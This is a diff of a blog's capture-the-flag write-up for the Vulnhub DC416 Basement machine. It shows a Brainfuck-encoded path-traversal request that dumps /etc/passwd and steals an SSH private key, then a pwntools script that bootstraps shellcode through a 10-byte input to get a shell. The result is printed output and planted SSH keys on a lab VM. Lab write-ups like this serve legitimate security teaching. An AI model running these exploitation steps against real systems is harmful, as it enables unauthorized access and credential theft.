+</span></span></code></pre></div><h2 id="tyler">tyler<a href="#tyler" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>When connecting to the webserver on port 8080 the following server header is returned</p>
-<pre tabindex="0"><code>------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.
-</code></pre><p>This string is definitely <a href="https://en.wikipedia.org/wiki/Brainfuck">Brainfuck</a>. Using an <a href="https://copy.sh/brainfuck/">online decoder</a> we can see the string translates back to <code>webf</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.
+</span></span></code></pre></div><p>This string is definitely <a href="https://en.wikipedia.org/wiki/Brainfuck">Brainfuck</a>. Using an <a href="https://copy.sh/brainfuck/">online decoder</a> we can see the string translates back to <code>webf</code>.</p>
 <p>When trying to access files in the webroot the webserver crashes and only comes up again after some time (probably by a cron job).</p>
 <p>All error messages are also translated to Brainfuck:</p>
-<pre tabindex="0"><code>root@kali:~# nc 192.168.56.101 8080
-webf
-HTTP/1.1 501 Not Implemented
-Content-type: text/html
-
-&lt;html&gt;&lt;title&gt;Error&lt;/title&gt;&lt;body bgcolor=ffffff&gt;
-501: Not Implemented
-&lt;p&gt;+[-------&gt;++&lt;]&gt;.+.+++++.[----&gt;+&lt;]&gt;+++.++[-&gt;+++&lt;]&gt;.+++++++++.++++++.-------.----------.: webf
-&lt;hr&gt;&lt;em&gt;------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.&lt;/em&gt;
-</code></pre><p>By looking at the process list again the binary running seems to be <code>tiny</code>:</p>
-<pre tabindex="0"><code>14709  1      run_tiny.sh              0        tyler     /bin/bash /home/tyler/run_tiny.sh
-14711  14709  tiny                     0        tyler     /home/tyler/tiny 8080
-</code></pre><p>By asking our friend google this seems to be the <a href="https://github.com/shenfeng/tiny-web-server">tiny-web-server</a>. This webserver behaves as pythons <code>SimpleHTTPServer</code> and serves the whole directory from where it is run. By looking at the issues page there seems to be an unpatched arbitrary file read vulnerability <a href="https://github.com/shenfeng/tiny-web-server/issues/2">https://github.com/shenfeng/tiny-web-server/issues/2</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~# nc 192.168.56.101 8080
+</span></span><span style="display:flex;"><span>webf
+</span></span><span style="display:flex;"><span>HTTP/1.1 501 Not Implemented
+</span></span><span style="display:flex;"><span>Content-type: text/html
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;html&gt;&lt;title&gt;Error&lt;/title&gt;&lt;body bgcolor=ffffff&gt;
+</span></span><span style="display:flex;"><span>501: Not Implemented
+</span></span><span style="display:flex;"><span>&lt;p&gt;+[-------&gt;++&lt;]&gt;.+.+++++.[----&gt;+&lt;]&gt;+++.++[-&gt;+++&lt;]&gt;.+++++++++.++++++.-------.----------.: webf
+</span></span><span style="display:flex;"><span>&lt;hr&gt;&lt;em&gt;------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.&lt;/em&gt;
+</span></span></code></pre></div><p>By looking at the process list again the binary running seems to be <code>tiny</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>14709  1      run_tiny.sh              0        tyler     /bin/bash /home/tyler/run_tiny.sh
+</span></span><span style="display:flex;"><span>14711  14709  tiny                     0        tyler     /home/tyler/tiny 8080
+</span></span></code></pre></div><p>By asking our friend google this seems to be the <a href="https://github.com/shenfeng/tiny-web-server">tiny-web-server</a>. This webserver behaves as pythons <code>SimpleHTTPServer</code> and serves the whole directory from where it is run. By looking at the issues page there seems to be an unpatched arbitrary file read vulnerability <a href="https://github.com/shenfeng/tiny-web-server/issues/2">https://github.com/shenfeng/tiny-web-server/issues/2</a>.</p>
 <p>Our webserver crashes when requesting files normally so let&rsquo;s try to request <code>../../../../../../../etc/passwd</code> encoded in Brainfuck</p>
-<pre tabindex="0"><code>root@kali:~# nc 192.168.56.101 8080
-GET ++[------&gt;+&lt;]&gt;+++..+.-..+.-..+.-..+.-..+.-..+.-..+.[---&gt;+&lt;]&gt;.[---&gt;+&lt;]&gt;---.++[-&gt;+++&lt;]&gt;+.-[--&gt;+&lt;]&gt;--.+[-----&gt;+&lt;]&gt;.[-----&gt;++&lt;]&gt;+.--[---&gt;+&lt;]&gt;--..++++.[-&gt;+++&lt;]&gt;-. HTTP/1.0
-
-HTTP/1.1 200 OK
-Server: ------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.
-Content-length: 1445
-Content-type: text/plain
-
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
-systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
-systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
-jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
-marla:x:1001:1001:marla,,,:/home/marla:/bin/marla
-tyler:x:1002:1002:tyler,,,:/home/tyler:/bin/tyler
-robert:x:1003:1003:robert,,,:/home/robert:/bin/bash
-sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
-</code></pre><p>Bingo!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~# nc 192.168.56.101 8080
+</span></span><span style="display:flex;"><span>GET ++[------&gt;+&lt;]&gt;+++..+.-..+.-..+.-..+.-..+.-..+.-..+.[---&gt;+&lt;]&gt;.[---&gt;+&lt;]&gt;---.++[-&gt;+++&lt;]&gt;+.-[--&gt;+&lt;]&gt;--.+[-----&gt;+&lt;]&gt;.[-----&gt;++&lt;]&gt;+.--[---&gt;+&lt;]&gt;--..++++.[-&gt;+++&lt;]&gt;-. HTTP/1.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 200 OK
+</span></span><span style="display:flex;"><span>Server: ------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.
+</span></span><span style="display:flex;"><span>Content-length: 1445
+</span></span><span style="display:flex;"><span>Content-type: text/plain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
+</span></span><span style="display:flex;"><span>systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+</span></span><span style="display:flex;"><span>systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+</span></span><span style="display:flex;"><span>systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+</span></span><span style="display:flex;"><span>jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
+</span></span><span style="display:flex;"><span>marla:x:1001:1001:marla,,,:/home/marla:/bin/marla
+</span></span><span style="display:flex;"><span>tyler:x:1002:1002:tyler,,,:/home/tyler:/bin/tyler
+</span></span><span style="display:flex;"><span>robert:x:1003:1003:robert,,,:/home/robert:/bin/bash
+</span></span><span style="display:flex;"><span>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+</span></span></code></pre></div><p>Bingo!</p>
 <p>So we are able to read files as <code>tyler</code> but we already looked around on the server as <code>jack</code> so we are interested in the files in tyler&rsquo;s home directory. We can not use tools like dirbuster because it crashes the server so my solution was to come up with a simple python script to encode all wordlist entries to Brainfuck, request the file and save it:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span>
@@ -525,33 +603,33 @@ sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
 </span></span><span style="display:flex;"><span>    counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><p>By executing the script the server crashed at the <code>.ssh</code> entry so it must be an issue when requesting directories. But this also drove me in the right direction to try if there is an <code>.ssh/id_rsa</code> private key file present.</p>
 <p>After modifying the script we are able to download the private key file, ssh to the server as <code>tyler</code> and get the next flag <code>flag{l3t_Th3_cH1P$_f4LL_wH3Re_tHey_m4y}</code>:</p>
-<pre tabindex="0"><code>root@kali:~/basement# ssh -i basement_tyler.key tyler@192.168.56.101
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Dec 17 10:25:57 2016 from 192.168.56.3
-well done! your flag is flag{l3t_Th3_cH1P$_f4LL_wH3Re_tHey_m4y}
-Connection to 192.168.56.101 closed.
-</code></pre><h1 id="robert">robert</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/basement# ssh -i basement_tyler.key tyler@192.168.56.101
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms for each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Sat Dec 17 10:25:57 2016 from 192.168.56.3
+</span></span><span style="display:flex;"><span>well done! your flag is flag{l3t_Th3_cH1P$_f4LL_wH3Re_tHey_m4y}
+</span></span><span style="display:flex;"><span>Connection to 192.168.56.101 closed.
+</span></span></code></pre></div><h2 id="robert">robert<a href="#robert" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Robert&rsquo;s flag took me the most time. There is a binary running on Port 10001 requesting 10 bytes from the user and then executes them. To play with this locally I added a <code>portfwd</code> in meterpreter.</p>
 <p>First I tried to get some custom shellcode into the 10 bytes but none of my attempts worked and this really frustrated me. So I tried to think about the program flow and how the program could be implemented and this ended up in some kind of blind shellcode crafting.</p>
 <p>I thought there must be a call to <code>read</code> writing the 10 bytes to an executable area in memory and then a <code>jmp</code> or <code>call</code> instruction has to be executed to get to the custom shellcode. If we are able to execute the <code>read</code> call again using a bigger length we would be able to write shellcode to memory and execute it.</p>
 <p>By looking at the <a href="http://syscalls.kernelgrok.com/">sys_read</a> syscall we can see the length to read needs to go in the <code>EDX</code> register.</p>
 <p>So our assumption about the execution flow is the following</p>
-<pre tabindex="0"><code>junk
-mmap
-junk
-printf(&#34;Tee hee! Gimme ten bytes to run!&#34;)
-junk
-read 10 bytes
-junk
-jmp/call to read bytes
-junk
-</code></pre><p>Hopefully the instruction executed is a <code>CALL</code> instruction because it pushes the current return address to the stack and executes a <code>JMP</code>. This way we could pop the adress from the stack and return to it a few instruction before and hope to hit the <code>read</code> syscall with our custom (bigger) <code>EDX</code> value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>junk
+</span></span><span style="display:flex;"><span>mmap
+</span></span><span style="display:flex;"><span>junk
+</span></span><span style="display:flex;"><span>printf(&#34;Tee hee! Gimme ten bytes to run!&#34;)
+</span></span><span style="display:flex;"><span>junk
+</span></span><span style="display:flex;"><span>read 10 bytes
+</span></span><span style="display:flex;"><span>junk
+</span></span><span style="display:flex;"><span>jmp/call to read bytes
+</span></span><span style="display:flex;"><span>junk
+</span></span></code></pre></div><p>Hopefully the instruction executed is a <code>CALL</code> instruction because it pushes the current return address to the stack and executes a <code>JMP</code>. This way we could pop the adress from the stack and return to it a few instruction before and hope to hit the <code>read</code> syscall with our custom (bigger) <code>EDX</code> value.</p>
 <p>My custom shellcode to pop the return address into a register, subtract a value from it and jump to it took too many bytes to also get a bigger value into <code>EDX</code>. So my approach was to execute the first read, add my custom <code>pop</code>, <code>sub</code>, <code>jmp</code> shellcode and also double the value in the <code>EDX</code> register which hopefully is still <code>10</code>. When executing this code a few times we should be able to double <code>EDX</code> on each run, execute a read with a big value and finally execute our shellcode. So for this to work a <code>CALL</code> instruction needs to be executed and <code>EDX</code> must not be changed.</p>
 <p>This approach was a lot try and error because there is absolutely no response but after doing hundreds of runs I finally was able to execute my own shellcode!</p>
 <p>The script does the following</p>
@@ -692,69 +770,91 @@ _ jump to the new value and hope we hit a location where the read call is execut
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
 </span></span></code></pre></div><p>Last output from the run:</p>
-<pre tabindex="0"><code>[+] Opening connection to 127.0.0.1 on port 10001: Done
-[*] Payload: \x01\xd2\x5f\x48\x83\xef\x25\xff\xe7\x90
-[*] Iterations: 8
-[*] EDX should now be 0x500
-[*] Sending shellcode
-[*] Found offset!!! 37
-[*] Switching to interactive mode
-$ $ id
-uid=1003(robert) gid=1003(robert) groups=1003(robert)
-$ $
-</code></pre><p>Now we are able to add our private key file to <code>/home/robert/.ssh/authorized_keys</code> connect as <code>robert</code> via SSH and get the next flag <code>flag{t3N_byt3$_0ugHt_t0_b3_eN0uGh_f0R_4nyb0dY}</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>[+] Opening connection to 127.0.0.1 on port 10001: Done
+</span></span><span style="display:flex;"><span>[*] Payload: \x01\xd2\x5f\x48\x83\xef\x25\xff\xe7\x90
+</span></span><span style="display:flex;"><span>[*] Iterations: 8
+</span></span><span style="display:flex;"><span>[*] EDX should now be 0x500
+</span></span><span style="display:flex;"><span>[*] Sending shellcode
+</span></span><span style="display:flex;"><span>[*] Found offset!!! 37
+</span></span><span style="display:flex;"><span>[*] Switching to interactive mode
+</span></span><span style="display:flex;"><span>$ $ id
+</span></span><span style="display:flex;"><span>uid=1003(robert) gid=1003(robert) groups=1003(robert)
+</span></span><span style="display:flex;"><span>$ $
+</span></span></code></pre></div><p>Now we are able to add our private key file to <code>/home/robert/.ssh/authorized_keys</code> connect as <code>robert</code> via SSH and get the next flag <code>flag{t3N_byt3$_0ugHt_t0_b3_eN0uGh_f0R_4nyb0dY}</code></p>
 <p>Now we can also get the <code>tenbytes</code> binary and look at it to confirm our script</p>
 <p><img src="/img/vulnhub_dc416_basement/binaryninja.png" alt="binaryninja"></p>
 <p>Thanks <a href="https://twitter.com/barrebas">@barrebas</a> for a lot hours trying to blindly bruteforce the binary :)</p>
 <p>The flags:</p>
-<pre tabindex="0"><code>flag{j4cks_t0t4L_l4cK_0f_$uRpr1sE}
-flag{bR4in_paRas1te$}
-flag{l3t_Th3_cH1P$_f4LL_wH3Re_tHey_m4y}
-flag{t3N_byt3$_0ugHt_t0_b3_eN0uGh_f0R_4nyb0dY}
-flag{l4y3rs_up0n_l4y3rs}
-</code></pre>
-                    </div>
-                </section>
-            </div>
-            <div class="footer">
-    <div class="pure-menu pure-menu-horizontal pure-menu-open">
-        <ul>
-            <li>Copyright by Christian Mehlmauer</li>
-            <li>source code available on <a href="https://github.com/firefart/firefart.github.io">Github</a></li>
-        </ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>flag{j4cks_t0t4L_l4cK_0f_$uRpr1sE}
+</span></span><span style="display:flex;"><span>flag{bR4in_paRas1te$}
+</span></span><span style="display:flex;"><span>flag{l3t_Th3_cH1P$_f4LL_wH3Re_tHey_m4y}
+</span></span><span style="display:flex;"><span>flag{t3N_byt3$_0ugHt_t0_b3_eN0uGh_f0R_4nyb0dY}
+</span></span><span style="display:flex;"><span>flag{l4y3rs_up0n_l4y3rs}
+</span></span></code></pre></div>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://firefart.at/post/vulnhub_dc416_baffle/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Vulnhub - DC416: Baffle Writeup</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://firefart.at/post/vulnhub_hackday_abania_walkthrough/">
+                <span class="button__text">Vulnhub - HackDay: Albania Writeup</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
     </div>
 </div>
-<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-<script type="text/javascript" src='https://firefart.at/js/firefart.js'></script>
 
-<script type="text/javascript">
-    var _paq = window._paq || [];
-     
-    _paq.push(["setCookieDomain", "*.firefart.at"]);
-    _paq.push(['trackPageView']);
-    _paq.push(['enableLinkTracking']);
-    (function () {
-        var u = "https://tracking.firefart.at/";
-        _paq.push(['setTrackerUrl', u + 'mat.php']);
-        _paq.push(['setSiteId', '1']);
-        var d = document,
-            g = d.createElement('script'),
-            s = d.getElementsByTagName('script')[0];
-        g.type = 'text/javascript';
-        g.async = true;
-        g.defer = true;
-        g.src = u + 'mat.js';
-        s.parentNode.insertBefore(g, s);
-    })();
-</script>
-<noscript>
-    <p><img src="https://tracking.firefart.at/mat.php?idsite=1&amp;rec=1" style="border:0;" alt="" /></p>
-</noscript>
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Copyright by Christian Mehlmauer</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
 
 
-        </div>
-    </div>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+  
 </div>
+
 </body>
-
 </html>
